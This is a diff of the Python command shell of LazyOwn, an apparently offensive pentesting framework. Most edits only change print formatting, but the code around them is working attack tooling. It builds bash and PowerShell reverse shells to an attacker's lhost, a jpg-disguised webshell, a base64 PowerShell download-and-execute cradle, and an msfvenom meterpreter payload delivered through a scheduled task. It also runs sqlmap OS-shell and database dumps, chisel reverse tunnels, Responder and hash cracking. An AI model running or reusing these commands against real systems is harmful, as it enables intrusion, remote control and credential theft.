+        print(f"[*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
         os.system(f"echo 'curl http://{lhost}/sessions/file.scf -o file.scf' |  xclip -sel clip")
         os.system("cd sessions && sudo impacket-smbserver smbfolder $(pwd) -smb2support")
         return
@@ -1303,7 +1322,7 @@ class LazyOwnShell(Cmd):
         if line:
             if line.startswith("req"):
                 parts = line.split(" ")
-                print("    [?] Nùmero de parametros: " + str(len(parts)))
+                print("Nùmero de parametros: " + str(len(parts)))
 
                 if len(parts) == 2:
                     arg1 = parts[0]
@@ -1314,12 +1333,12 @@ class LazyOwnShell(Cmd):
                     print(file)
                     if not os.path.isfile(file) or not os.access(file, os.R_OK):
                         print(
-                            f"    [-] Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
+                            f"[-] Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                         )
 
                         return
                     print(
-                        f"    [*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
+                        f"[*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                     )
                     os.system(
                         f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
@@ -1339,7 +1358,7 @@ class LazyOwnShell(Cmd):
 
                         return
                     print(
-                        f"    [*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 10"
+                        f"[*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 10"
                     )
                     os.system(
                         f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 3"
@@ -1355,41 +1374,41 @@ class LazyOwnShell(Cmd):
                 print(file)
                 if not os.path.isfile(file) or not os.access(file, os.R_OK):
                     print(
-                        f"    [-] Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
+                        f"[-] Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                     )
 
                     return
                 print(
-                    f"    [*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
+                    f"[*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
                 )
                 os.system(
                     f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 3"
                 )
             elif line.startswith("-wiz"):
-                print("    [*] Try... sqlmap --wizard")
+                print("[*] Try... sqlmap --wizard")
                 os.system("sqlmap -wizard")
         else:
             if not url:
                 print(
-                    "    [?] url must be set, ex: (set url http://url.com), see <help set> or <help sqlmap> to more info..."
+                    "url must be set, ex: (set url http://url.com), see <help set> or <help sqlmap> to more info..."
                 )
             return
 
-            print(f"    [*] try... sqlmap -u {url} --os-shell --forms --crawl=2")
+            print(f"[*] try... sqlmap -u {url} --os-shell --forms --crawl=2")
             os.system(f"sqlmap -u {url} --os-shell --forms --crawl=2")
         return
 
     def do_proxy(self, line):
         """Small proxy to modify the request on the fly..."""
 
-        print("    [*] ejecutando Lazy Proxy ...")
+        print("[*] ejecutando Lazy Proxy ...")
         os.system(f"python3 modules/lazyproxy.py")
         print(f"    {RED}[*] {YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}")
         return
 
     def do_createwebshell(self, line):
         """Crea una webshell disfrazada de jpg en el directorio sessions/"""
-        print("    [*] creando la shell disfrazada de jpg")
+        print("[*] creando la shell disfrazada de jpg")
         os.system("python3 modules/lazycreate_webshell.py")
         os.system("cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php")
         return
@@ -1400,13 +1419,13 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
 
         if not lport or not lhost:
-            print(f"    [?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
+            print(f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
             return
 
         revshell = f"""#!/bin/bash
         bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
         """.replace('        ','')
-        print(f"    [*] Try... echo '{revshell}' > sessions/revshell.sh ")
+        print(f"[*] Try... echo '{revshell}' > sessions/revshell.sh ")
         os.system(f"echo '{revshell}' > sessions/revshell.sh ")
 
     def do_createwinrevshell(self, line):
@@ -1415,18 +1434,18 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
         filename = 'sessions/revshell.ps1'
         if not lport or not lhost:
-            print(f"    [?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
+            print(f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
             return
 
         revshell = """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
         """.replace('{lhost}',lhost).replace('{lport}',str(lport)).replace('        ','')
 
-        print(f"    [*] Try... echo '{revshell}' > sessions/revshell.ps1 \n")
+        print(f"[*] Try... echo '{revshell}' > sessions/revshell.ps1 \n")
         
         with open(filename, 'w') as f:
             f.write(revshell)
         f.close()
-        print(f"    [*] Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")
+        print(f"[*] Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")
 
     def do_createhash(self, line):
         """Crea un archivo hash.txt en el directorio sessions"""
@@ -1456,9 +1475,9 @@ class LazyOwnShell(Cmd):
     def do_download_exploit(self, line):
         """download exploits in external/.exploits/"""
         os.system("cd external && ./install_external.sh ")
-        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
+        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
         os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
-        os.system('echo "    [\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"')
+        os.system('echo "[\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"')
         print(f"    {YELLOW}[*] {GREEN} Web server at external/.exploit in port {RED} 80 {RESET}")
         os.system("cd external/.exploit && sudo python3 -m http.server 80")
         print(f"    {RED}[*] {YELLOW} Shutdown Web server at external/.exploit in port {RED} 80 {RESET}")
@@ -1470,13 +1489,13 @@ class LazyOwnShell(Cmd):
         """dirsearch -u http://url.ext/ -x 403,404,400"""
         url = self.params["url"]
         if not url:
-            print("    [-] url must be set: use set url http://url.ext/ more info in help set")
+            print("[-] url must be set: use set url http://url.ext/ more info in help set")
             return
         if is_binary_present("dirsearch"):
-            print("    [*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
+            print("[*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
             os.system(f"dirsearch -u {url} -x 403,404,400")
         else:
-            print("    [-] dirsearch is not installed, installing... (control + c to cancel)")
+            print("[-] dirsearch is not installed, installing... (control + c to cancel)")
             os.system(
                 f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400"
             )
@@ -1486,13 +1505,13 @@ class LazyOwnShell(Cmd):
         """example: sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512"""
         wordlist = self.params["wordlist"]
         if not wordlist:
-            print("    [-] wordlist must be set use set wordlist <path_to_wordlist>")
+            print("[-] wordlist must be set use set wordlist <path_to_wordlist>")
             return
         if line:
-            print(f"    [*] sudo john hash.txt {line}") # line like -format=Raw-SHA512
+            print(f"[*] sudo john hash.txt {line}") # line like -format=Raw-SHA512
             os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
         else:
-            print("    [*] sudo john hash.txt --show")
+            print("[*] sudo john hash.txt --show")
             os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
         return
 
@@ -1504,7 +1523,7 @@ class LazyOwnShell(Cmd):
                 "    wordlist must be set and you need pass the hash in argument ex: hashcat hash"
             )
             return
-        print(f"    [*] hashcat -a 0 -m {line} {wordlist}")
+        print(f"[*] hashcat -a 0 -m {line} {wordlist}")
         os.system(f"hashcat -a 0 -m {line} {wordlist}")
         return
 
@@ -1512,15 +1531,15 @@ class LazyOwnShell(Cmd):
         """sudo responder -I tun0"""
         device = self.params["device"]
         if not device:
-            print("    [-] device must be set use set device <network_device_ex_tun0>")
+            print("[-] device must be set use set device <network_device_ex_tun0>")
             return
-        print(f"    [*] sudo responder -I {device}")
+        print(f"[*] sudo responder -I {device}")
         os.system(f"sudo responder -I {device}")
         return
 
     def do_ip(self,line):
-        """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
-        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
+        """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
+        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
         os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
         print(f"    {BLUE}[*] ip from tun0 copied to clipboard :) {RESET}")
         return
@@ -1529,7 +1548,7 @@ class LazyOwnShell(Cmd):
         """Copy rhost to clipboard"""
         rhost = self.params["rhost"]
         if not rhost:
-            print(f"    {RED}[?] {YELLOW} rhost must be set, use: {GREEN}payload {YELLOW}or {GREEN}set rhost 10.10.10.10{RESET}")
+            print(f"    {RED}{YELLOW} rhost must be set, use: {GREEN}payload {YELLOW}or {GREEN}set rhost 10.10.10.10{RESET}")
             return
         os.system(f"echo '{rhost}' | xclip -sel clip")
         print(f"    {BLUE}[*] ip from payload: {rhost=}, copied to clipboard :) {RESET}")
@@ -1546,7 +1565,7 @@ class LazyOwnShell(Cmd):
     def do_py3ttyup(self,line):
         """copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah... """
         os.system("echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip")
-        print("    [+] Try... echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip # copied to clipboard :) ")
+        print("[+] Try... echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip # copied to clipboard :) ")
         return
     
     def do_rev(self,line):
@@ -1554,9 +1573,9 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
         lport = self.params["lport"]
         if not lhost or not lport:
-            print(f"    {YELLOW} [?] lhost and lport must be set.{RESET}")
+            print(f"    {YELLOW} lhost and lport must be set.{RESET}")
             return
-        print(f"    [+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+        print(f"[+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
         os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
         return
 
@@ -1565,7 +1584,7 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
         lport = self.params["lport"]
         if not lhost or not lport:
-            print(f"    {YELLOW} [?] lhost and lport must be set.{RESET}")
+            print(f"    {YELLOW} lhost and lport must be set.{RESET}")
             return
 
         os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
@@ -1578,7 +1597,7 @@ class LazyOwnShell(Cmd):
         """run nc -lvnp 6666 :) """
         lport = self.params["lport"]
         if not lport and not line:
-            print(f"    {YELLOW} [?] lport must be set or pass the port by parameter like: nc 6666.{RESET}")
+            print(f"    {YELLOW} lport must be set or pass the port by parameter like: nc 6666.{RESET}")
             return
         if not line:
             print(f"    {GREEN}[+] Try.. nc -lvnp {lport}{RESET}")
@@ -1592,7 +1611,7 @@ class LazyOwnShell(Cmd):
     def do_sh(self,line):
         """execute some command direct in shell to avoid exit LazyOwn ;)"""
         if not line:
-            print(f"    {YELLOW}[?] you must pass the command linke argument")
+            print(f"    {YELLOW}you must pass the command linke argument")
             return
         print(f"    {GREEN}[*]Try... {line}{RESET}")
         os.system(f"{line}")
@@ -1694,16 +1713,16 @@ class LazyOwnShell(Cmd):
 
     def do_vpn(self,line):
         """Open vpn like htb vpn"""
-        print("    [+] Try... sudo openvpn *.ovpn")
+        print("[+] Try... sudo openvpn *.ovpn")
         os.system("sudo openvpn *.ovpn")
         print(f"    {RED}[*] {YELLOW} Shutdown vpn {RED} [;,;] {RESET}")
         return
 
     def do_www(self, line):
         """Start a web server with python3"""
-        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
+        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
         os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
-        os.system('echo "    [\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"')
+        os.system('echo "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"')
         print(f"    {YELLOW}[*] {GREEN} Web server at sessions in port {RED} 80 {RESET}")
         os.system("cd sessions && sudo python3 -m http.server 80")
         print(f"    {RED}[*] {YELLOW} Shutdown Web server at sessions in port {RED} 80 {RESET}")
@@ -1718,19 +1737,49 @@ class LazyOwnShell(Cmd):
     def do_samrdump(self, line):
         """impacket-samrdump -port 445 10.10.10.10"""
         if not self.params["rhost"]:
-            print("    [?] rhost must be set")
+            print_error("rhost must be set")
             return
         rhost = self.params["rhost"]
-        print(f"    [-] try impacket-samrdump -port 139  {rhost}")
+        print_msg(f"Try... impacket-samrdump -port 139  {rhost}")
         os.system(f"impacket-samrdump -port 139  {rhost}")
-        print(f"    [-] try impacket-samrdump -port 445  {rhost}")
+        print_msg(f"Try... impacket-samrdump -port 445  {rhost}")
         os.system(f"impacket-samrdump -port 445  {rhost}")
 
         return
+
+    def do_snmpcheck(self, line):
+        """snmp-check 10.10.10.10"""
+        rhost = self.params["rhost"]
+        if not rhost:
+            print_error("rhost must be set")
+            return
+        
+        print_msg(f"Try... snmp-check {rhost}")
+        os.system(f"snmp-check {rhost}")
+        return
+
+    def do_sshd(self, line):
+        """sudo systemctl start ssh"""
+        print_msg(f"Try... sudo systemctl start ssh")
+        os.system(f"sudo systemctl start ssh")
+        os.system(f"sudo systemctl status ssh")
+        return
+
+    def do_nmapscripthelp(self, line):
+        """help to know nmap scripts: nmap --script-help 'snmp*' """
+        if not line:
+            print_error("you must pass the script to find by argument.")
+            return
+        
+        print_msg(f"Try... nmap --script-help '{line}*'{RESET}")
+        os.system(f"nmap --script-help '{line}*'")
+        print_msg(f"now you can run : {MAGENTA} sh sudo nmap -sCV -p <port> --script <script1,script2 <ip> {RESET}")
+        return        
+
     def do_clean(self, line):
         """delete all from sessions"""
         os.system("rm external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf")
-        print(f"    {GREEN}[*]{YELLOW} cleanned sessions & external directory. {RESET}")
+        print_msg(f"Cleanned sessions & external directory. {RESET}")
         return
 
     def do_pyautomate(self, line):
@@ -1746,19 +1795,45 @@ class LazyOwnShell(Cmd):
         for xml_file in xml_files:
             xml_path = os.path.join(directory, xml_file)
             command = f"python3 pwntomate.py {xml_path} -x"
-            print(f"    {GREEN}[*] Executing command: {MAGENTA}{command}{RESET}")
+            print_msg(f"Executing command: {MAGENTA}{command}{RESET}")
             try:
                 subprocess.run(command, shell=True, check=True)
             except subprocess.CalledProcessError as e:
-                print(f"    {RED}[-] Error executing command for {xml_file}: {e}{RESET}")        
-        print(f"    {GREEN}[*]{YELLOW} tha target was pwntomated 🍅. {RESET}")
+                print_error(f"Error executing command for {xml_file}: {e}{RESET}")        
+        print_msg(f"{YELLOW} tha target was pwntomated 🍅. {RESET}")
         return
+
     def do_alias(self, line):
         """Imprime todos los alias configurados."""
         aliases = LazyOwnShell().aliases
         for alias, command in aliases.items():
-            print(f"    [>]{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} ")
+            print_msg(f"{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} ")
         return
+
+    def do_tcpdump_icmp(self, line):
+        """se pone en escucha con la interfaz señalada por argumento ej: tcpdump_icmp tun0"""
+        if not line:
+            print_error("necesitas pasarle la interfaz que se quedarà en escucha ej: tcpdump_icmp tun0")
+            return
+        print_msg(f"{WHITE} sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} icmp -n{RESET} ")
+        os.system(f"sudo tcpdump -i {line} icmp -n")
+        return       
+
+    def do_winbase64payload(self, line):
+        """Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost"""
+        lhost = self.params['lhost']
+        if not lhost:
+            print_error(f"lhost debe estàr seteado. Ej: set lhost 10.10.10.10")
+            return
+        if not line:
+            print_error(f"Debes pasarle el nombre del archivo puesto en el directorio sessions ejemplo: {GREEN}winbase64payload payload.ps1")
+            return
+        
+        os.system(f'echo -n"IEX(New-Object New.WebClient).downloadString(\'http://{lhost}/{line}\')"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip')
+        print_msg(f'Try... echo -n"IEX(New-Object New.WebClient).downloadString(\'http://{lhost}/{line}\')" | iconv -t utf-16le | base64')
+        print_msg('copied to clipboard')
+        return
+
     def do_rubeus(self,line):
         """copia a la clipboard la borma de descargar Rubeus"""
         lhost = self.params["lhost"]
@@ -1774,7 +1849,7 @@ class LazyOwnShell(Cmd):
         """run socat in ip:port seted by argument config the port 1080 in /etc/proxychains.conf"""
         print(f"    {YELLOW}[+] you must seted {GREEN}socks5 127.0.0.1 1080 {YELLOW}at {GREEN}/etc/proxychains.conf{RESET}")
         if not line:
-            print(f"    [?]{YELLOW} you must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} ")
+            print(f"[?]{YELLOW} you must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} ")
             return
         print(f'    {GREEN}[*] Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}')
         os.system(f'socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080')
@@ -1785,10 +1860,10 @@ class LazyOwnShell(Cmd):
         """run download_resources command to download and run chisel :D like ./chisel_linux_amd64 server -p 3333 --reverse -v """
         lhost = self.params["lhost"]
         if not lhost:
-            print(f"    [?]{YELLOW} you must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} ")
+            print(f"[?]{YELLOW} you must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} ")
             return
         if not line:
-            print(f"    [?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
+            print(f"[?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
             return
         if not os.path.exists('sessions/chisel_1.9.1_linux_amd64.gz'):
             print(f"    {YELLOW}[+] you must run download_resources before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}")
@@ -1800,8 +1875,8 @@ class LazyOwnShell(Cmd):
             lport = args[0]
             rport = args[1]
 
-            print(f'    {GREEN}[*]Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{rport} R:{lport} to clipboard :D')
-            command = f"iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ; .\\chisel.exe client -v {lhost}:{rport} R:{lport}"
+            print(f'    {GREEN}[*]Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{rport} R:{lport}:127.0.0.1:{lport} R:389:127.0.0.1:389  to clipboard :D')
+            command = f"iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ; .\\chisel.exe client -v {lhost}:{rport} R:{lport}:127.0.0.1:{lport} R:389:127.0.0.1:389 "
             cmdd = f'echo "{command}" | xclip -sel clip'
             print(f"{MAGENTA}[+] Command to copy: {GREEN}{command}{RESET}")
             os.system(cmdd)
@@ -1809,7 +1884,7 @@ class LazyOwnShell(Cmd):
             print(f"    {RED}[*] {YELLOW} Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")
 
         else:
-             print(f"    [?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
+             print(f"[?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
         
         return
         
@@ -1933,7 +2008,7 @@ class LazyOwnShell(Cmd):
             payload = "C:\\xampp\\htdocs\\payload.exe"  # Ruta al payload
             args = line.split(' ')
             if not lhost or not lport:
-                print("    [-] lhost o lport deben estar establecidos. Usa 'set lhost <ip>'")
+                print("[-] lhost o lport deben estar establecidos. Usa 'set lhost <ip>'")
             else:
                 if len(args) == 1:
                     setpayload = 'windows/meterpreter/reverse_tcp'
@@ -1947,7 +2022,7 @@ class LazyOwnShell(Cmd):
                 payload_path = os.path.join(web_root, "payload.exe")
                 msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                 subprocess.run(msfvenom_cmd, shell=True, check=True)
-                print("    [+] Payload creado con éxito en", payload_path)
+                print("[+] Payload creado con éxito en", payload_path)
 
                 # Paso 2: Crear el archivo XML para la descarga
                 xml_content = f"""<?xml version="1.0"?>
@@ -1961,10 +2036,10 @@ class LazyOwnShell(Cmd):
                 xml_path = os.path.join(web_root, "download_payload.xml")
                 with open(xml_path, 'w') as xml_file:
                     xml_file.write(xml_content)
-                print("    [+] Archivo XML creado con éxito en", xml_path)
+                print("[+] Archivo XML creado con éxito en", xml_path)
 
                 # Este paso debe realizarse manualmente: Inserta la macro en tu documento de Office y guárdalo en la ruta especificada.
-                print(f"    [+] Asegúrate de que el payload esté en: {payload}")
+                print(f"[+] Asegúrate de que el payload esté en: {payload}")
 
                 # Paso 4: Crear el archivo .lnk con PowerShell
                 ps_script_content = f"""
@@ -1977,12 +2052,12 @@ class LazyOwnShell(Cmd):
                 with open(ps_script_path, 'w') as ps_script_file:
                     ps_script_file.write(ps_script_content)
                 
-                print(f"    [+] Script de PowerShell creado en {ps_script_path}")
-                print("    [+] Ejecuta este script en la máquina Windows para crear el archivo .lnk")
+                print(f"[+] Script de PowerShell creado en {ps_script_path}")
+                print("[+] Ejecuta este script en la máquina Windows para crear el archivo .lnk")
 
                 # Nota: Este paso debe ejecutarse en la máquina Windows
                 cmd = """echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/download_payload.xml\' -OutFile \'C:\\Windows\\Temp\\download_payload.xml\'; schtasks /create /tn \'DownloadPayload\' /xml \'C:\\Windows\\Temp\\download_payload.xml\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
-                print(f"    [+] El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
+                print(f"[+] El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
                 os.system(cmd)
                 return
         elif line.startswith('autoroute'):
@@ -2054,7 +2129,7 @@ class LazyOwnShell(Cmd):
         """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
         args = shlex.split(line)
         if len(args) != 2:
-            print("    [?] Usage: encrypt <file_path> <key>")
+            print("Usage: encrypt <file_path> <key>")
             return
 
         file_path, key = args
@@ -2066,15 +2141,15 @@ class LazyOwnShell(Cmd):
             encrypted_data = xor_encrypt_decrypt(data, key)
             with open(file_path + ".enc", "wb") as f:
                 f.write(encrypted_data)
-            print(f"    [+] File encrypted: {file_path}.enc")
+            print(f"[+] File encrypted: {file_path}.enc")
         except FileNotFoundError:
-            print(f"    [?] File not found: {file_path}")
+            print(f"File not found: {file_path}")
 
     def do_decrypt(self, line):
         """Decrypt a file using XOR. Usage: decrypt <file_path> <key>"""
         args = shlex.split(line)
         if len(args) != 2:
-            print("    [?] Usage: decrypt <file_path> <key>")
+            print("Usage: decrypt <file_path> <key>")
             return
 
         file_path, key = args
@@ -2086,9 +2161,9 @@ class LazyOwnShell(Cmd):
             decrypted_data = xor_encrypt_decrypt(data, key)
             with open(file_path.replace(".enc", ""), "wb") as f:
                 f.write(decrypted_data)
-            print(f"    [+] File decrypted: {file_path.replace('.enc', '')}")
+            print(f"[+] File decrypted: {file_path.replace('.enc', '')}")
         except FileNotFoundError:
-            print(f"    [?] File not found: {file_path}")
+            print(f"File not found: {file_path}")
 
     def get_output(self):
         """Devuelve la salida acumulada"""
@@ -2109,6 +2184,7 @@ if __name__ == "__main__":
         if arg.startswith("-c"):
             cmd = arguments[1]
             p.onecmd('p')
+            os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
             p.onecmd(cmd)
             p.cmdloop()
 
@@ -2117,6 +2193,7 @@ if __name__ == "__main__":
         time.sleep(0.2)    
     
     p.onecmd('p')
+    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
     p.cmdloop()
     
     
